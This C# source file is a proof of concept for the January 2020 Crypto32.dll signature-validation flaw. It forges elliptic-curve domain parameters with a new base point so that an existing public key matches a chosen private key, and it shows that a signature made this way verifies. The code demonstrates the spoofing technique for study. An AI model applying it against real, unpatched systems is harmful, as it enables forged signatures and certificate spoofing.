using System;
using System.Numerics;
using NIST.CVP.Crypto.Common.Asymmetric.DSA.ECC;
using NIST.CVP.Crypto.Common.Asymmetric.DSA.ECC.Enums;
using NIST.CVP.Crypto.Common.Hash.ShaWrapper;
using NIST.CVP.Crypto.DSA.ECC;
using NIST.CVP.Crypto.SHAWrapper;
using NIST.CVP.Math;
using NIST.CVP.Math.Entropy;
using NIST.CVP.Math.Helpers;

namespace Crypto32Test
{
    /*
     * 
     * Proof of concept for Crypto32.dll vulnerability announced 1/14/20
     *
     * Takes a known public key, and creates a new set of domain parameters (BasePointG) to produce the same
     * public key.
     *
     * From there you can produce signatures that verify under the new domain parameters.
     *
     * The vulnerability is that the implementation only looked at the matching public key to prove trust.
     *
     * In reality, the implementation should look at both the public key and domain parameters to prove trust.
     * 
     */
    public class Program
    {
        public static void Main()
        {
            var sha = new ShaFactory().GetShaInstance(new HashFunction(ModeValues.SHA2, DigestSizes.d256));
            var nonceProvider = new RandomNonceProvider(new EntropyProvider(new Random800_90()));
            
            var ecdsa = new EccDsa(sha, nonceProvider, EntropyProviderTypes.Random);
            var domainParameters = new EccDomainParameters(new EccCurveFactory().GetCurve(Curve.P256));
            var key = ecdsa.GenerateKeyPair(domainParameters).KeyPair;
            
            Console.WriteLine("Original Key");
            Console.WriteLine($"Public Q: ({NumToHex(key.PublicQ.X)}, {NumToHex(key.PublicQ.Y)})");
            Console.WriteLine($"Private D: {NumToHex(key.PrivateD)}");

            Console.WriteLine();
            Console.WriteLine("Original Basis Point");
            Console.WriteLine($"G: ({NumToHex(domainParameters.CurveE.BasePointG.X)}, {NumToHex(domainParameters.CurveE.BasePointG.Y)})");

            var dPrime = new BitString("BEEFFACE").ToPositiveBigInteger();
            var GPrime = domainParameters.CurveE.Multiply(key.PublicQ, dPrime.ModularInverse(domainParameters.CurveE.OrderN));
            
            Console.WriteLine();
            Console.WriteLine("New Basis Point");
            Console.WriteLine($"G: ({NumToHex(GPrime.X)}, {NumToHex(GPrime.Y)})");
            
            var newKey = new EccKeyPair(key.PublicQ, dPrime);
            
            var newCurve = new PrimeCurve(Curve.P256, domainParameters.CurveE.FieldSizeQ, domainParameters.CurveE.CoefficientB, GPrime, domainParameters.CurveE.OrderN);
            var newDomainParameters = new EccDomainParameters(newCurve);

            var message = new BitString("1234");
            var signature = ecdsa.Sign(newDomainParameters, newKey, message).Signature;
            
            Console.WriteLine();
            Console.WriteLine($"Public Q: ({NumToHex(newKey.PublicQ.X)}, {NumToHex(newKey.PublicQ.Y)})");
            Console.WriteLine($"Private D: {NumToHex(newKey.PrivateD)}");

            // Vulnerability is not checking that the newDomainParameters are different than domainParameters
            var verify = ecdsa.Verify(newDomainParameters, newKey, message, signature);

            Console.WriteLine();
            Console.WriteLine("Does the signature verify?");
            Console.WriteLine(verify.Success ? "Yes": "No");
        }

        private static string NumToHex(BigInteger x)
        {
            return new BitString(x).ToHex();
        }
    }
}